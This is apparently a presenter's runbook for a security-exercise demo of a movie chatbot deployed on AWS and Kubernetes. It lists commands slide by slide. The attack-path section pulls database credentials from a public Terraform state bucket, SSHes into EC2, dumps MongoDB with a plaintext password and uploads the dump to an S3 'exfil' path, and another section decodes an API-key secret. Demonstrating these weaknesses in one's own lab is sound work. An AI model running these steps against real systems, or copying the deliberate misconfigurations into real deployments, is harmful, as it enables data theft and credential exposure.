# Demo Runbook — Commands in Presentation Order
# Copy from here during the live demo. Do not open PRESENTATION_SCRIPT.md while screen sharing.

---

## SLIDE 5 — Live Demo (App)

Browser:
```
https://movie-buddy.app
```

Ask the chatbot:
```
What's a good family film for a rainy evening with kids aged 8 and 12?
```

Terminal — prove MongoDB persistence:
```bash
kubectl exec -it $(kubectl get pod -l app=movie-buddy -o jsonpath='{.items[0].metadata.name}') \
  -- python3 -c "
from pymongo import MongoClient
import os, json
c = MongoClient(os.environ['MONGO_URL'])
docs = list(c.movie_buddy.profiles.find({}, {'_id': 0}))
print(json.dumps(docs, indent=2, default=str))
"
```

Terminal — show pod running on Kubernetes:
```bash
kubectl get pods -o wide
```

AWS Console:
```
EC2 → Instances → movie-buddy-mongodb
```

---

## SLIDE 6 — DevSecOps Pipeline

GitHub:
```
github.com/oleksii-androsov/ai-learning
```

GitHub Actions tab — show both workflows (Infra CI, App CI/CD)

Click into Infra CI run → Checkov step (show findings + approval gate)

Click into App CI/CD run → Build, scan, push, deploy job → Trivy step (show findings)

GitHub repo:
```
Security → Code scanning
```

(No terminal commands for this slide — pure console/browser navigation)

---

## SLIDE 7 — Business Benefits and Risks

Terminal — three intentional weaknesses, live proof:
```bash
# SSH open to the entire internet
aws ec2 describe-security-groups --group-ids sg-03dce51e1f51d0137 \
  --query "SecurityGroups[0].IpPermissions" --output table
```

```bash
# AdministratorAccess on the EC2 role
aws iam list-attached-role-policies \
  --role-name movie-buddy-ec2-role \
  --query "AttachedPolicies[*].PolicyName" --output table
```

```bash
# Cluster-admin on the Kubernetes pod
kubectl get clusterrolebinding movie-buddy-cluster-admin -o yaml
```

---

## SLIDE 8 — Security Findings

AWS Console:
```
GitHub Actions → Infra CI run → Checkov step
```

```
AWS Console → Inspector → filter: Resource type = EC2 Instance, Severity = Critical
```

Click into the libssh / libssh-4 finding (show detail)

```
AWS Console → Inspector → filter: Resource type = ECR Container Image
```

```
AWS Console → GuardDuty → Findings
```

```
AWS Console → Config → Rules
```

```
AWS Console → CloudTrail → Event history
```

---

## SLIDE 9 — Attack Path Demo (Value of Wiz)

**This is the centerpiece — run in this exact order.**

Browser — public bucket, no login:
```
https://movie-buddy-tfstate-329153220664.s3.amazonaws.com/
```

Terminal — extract MongoDB credentials from the public state file:
```bash
aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate - \
  | python3 -m json.tool | grep -A3 mongodb_url
```

Terminal — SSH into EC2 (open port 22):
```bash
ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
```

**Inside the EC2 shell** — dump the database:
```bash
mongodump --host localhost --port 27017 \
  -u admin -p 'MovieBuddy2024!' --authenticationDatabase admin \
  --db movie_buddy --out /tmp/exfil
```

**Inside the EC2 shell** — package and exfiltrate to S3 using the instance's own IAM role:
```bash
tar -czf /tmp/movie_buddy_dump.tar.gz -C /tmp exfil

aws s3 cp /tmp/movie_buddy_dump.tar.gz \
  s3://movie-buddy-tfstate-329153220664/exfil/movie_buddy_dump.tar.gz
```

**Exit EC2, back on local terminal** — confirm exfiltration succeeded:
```bash
exit
```

```bash
aws s3 ls s3://movie-buddy-tfstate-329153220664/exfil/
```

---

## NOT IN MAIN FLOW — only if asked / time permits

### wizexercise.txt proof (if challenged)
```bash
kubectl exec -it $(kubectl get pod -l app=movie-buddy -o jsonpath='{.items[0].metadata.name}') -- cat /app/wizexercise.txt
```

### MongoDB backup proof (if asked, or show proactively during attack path section)
```bash
aws s3 ls s3://movie-buddy-db-backups/

ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "cat /usr/local/bin/backup-mongodb.sh"

ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "cat /etc/cron.d/mongodb-backup"
```

### Kubernetes secrets proof (if asked how secrets are managed)
```bash
kubectl get secrets
kubectl get secret movie-buddy-secrets -o jsonpath='{.data}' | python3 -m json.tool
kubectl get secret movie-buddy-secrets -o jsonpath='{.data.anthropic_api_key}' | base64 -d
```

### MongoDB version / OS version proof (if asked to confirm outdated software)
```bash
ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "mongod --version"
ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "lsb_release -a"
```

### Ingress / ALB detail (if asked about HTTPS setup)
```bash
kubectl describe ingress movie-buddy-ingress
```

---

## PRE-FLIGHT CHECKLIST (run morning of presentation)

- [ ] `kubectl get pods -o wide` — confirm pod is Running, not CrashLoopBackOff
- [ ] Open https://movie-buddy.app in browser — confirm app responds
- [ ] `ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "echo ok"` — confirm SSH key + IP still work
- [ ] Confirm EC2 public IP hasn't changed (instances get a new IP on stop/start, not on reboot)
- [ ] Clean up previous exfil test file: `aws s3 rm s3://movie-buddy-tfstate-329153220664/exfil/movie_buddy_dump.tar.gz` (so the demo shows a fresh timestamp)
- [ ] Confirm AWS CLI is authenticated on the machine you're presenting from: `aws sts get-caller-identity`
- [ ] Confirm kubectl context points to the right cluster: `kubectl config current-context`
- [ ] Have this file (`DEMO_RUNBOOK.md`) open in a separate window/tab, not the one you're sharing — or open in the terminal pane if sharing full screen
